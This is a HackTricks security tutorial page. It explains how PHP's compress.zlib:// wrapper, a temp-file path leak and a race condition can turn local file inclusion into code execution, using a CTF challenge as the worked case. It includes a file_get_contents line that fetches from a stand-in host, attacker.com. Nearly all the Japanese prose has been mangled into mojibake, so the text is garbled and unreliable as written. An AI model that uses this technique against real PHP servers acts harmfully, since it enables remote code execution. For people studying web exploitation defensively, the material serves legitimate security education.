# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` ã¨ `PHP_STREAM_PREFER_STDIO`

`PHP_STREAM_PREFER_STDIO` ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ `compress.zlib://` ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§é–‹ã‹ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€å¾Œã§æ¥ç¶šã«åˆ°ç€ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’æ›¸ãç¶šã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€æ¬¡ã®ã‚ˆã†ãªå‘¼ã³å‡ºã—ã‚’æ„å‘³ã—ã¾ã™:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
http://attacker.com/fileã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ãã®å¾Œã€ã‚µãƒ¼ãƒãƒ¼ã¯æœ‰åŠ¹ãªHTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¿œç­”ã—ã€æ¥ç¶šã‚’ç¶­æŒã—ã€å¾Œã§ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¾ã‚Œã‚‹è¿½åŠ ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®æƒ…å ±ã¯ã€php-srcã‚³ãƒ¼ãƒ‰ã®main/streams/cast.cã®ã“ã®éƒ¨åˆ†ã§ç¢ºèªã§ãã¾ã™ï¼š
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹RCE

[**ã“ã®CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ã¯ã€å‰ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦è§£æ±ºã•ã‚Œã¾ã—ãŸã€‚

æ”»æ’ƒè€…ã¯ã€**è¢«å®³è€…ã‚µãƒ¼ãƒãƒ¼ãŒæ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€æ¥ç¶šã‚’é–‹ã**ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã¯**`compress.zlib`**ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

**æ¥ç¶š**ãŒå­˜åœ¨ã—ã¦ã„ã‚‹é–“ã€æ”»æ’ƒè€…ã¯**ä½œæˆã•ã‚ŒãŸä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã¾ã™**ï¼ˆã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦æ¼æ´©ã•ã‚Œã¾ã™ï¼‰ã€‚

**æ¥ç¶š**ãŒã¾ã ã‚ªãƒ¼ãƒ—ãƒ³ã®é–“ã€æ”»æ’ƒè€…ã¯**è‡ªåˆ†ãŒåˆ¶å¾¡ã™ã‚‹ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€LFIã‚’æ‚ªç”¨ã—ã¾ã™**ã€‚

ã—ã‹ã—ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã«ã¯**`<?`ã‚’å«ã‚€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿è¾¼ã¿ã‚’é˜²ããƒã‚§ãƒƒã‚¯**ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯**ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚ã¾ã ã‚ªãƒ¼ãƒ—ãƒ³ã®æ¥ç¶šã§ã€**æ”»æ’ƒè€…**ã¯**ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒãƒ•ã‚¡ã‚¤ãƒ«ã«ç¦æ­¢ã•ã‚ŒãŸæ–‡å­—ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ãŸå¾Œã«**PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**é€ä¿¡ã—ã¾ã™ãŒã€**ãã®å†…å®¹ã‚’èª­ã¿è¾¼ã‚€å‰ã«**è¡Œã„ã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ã®ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã¨CTFã®èª¬æ˜ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
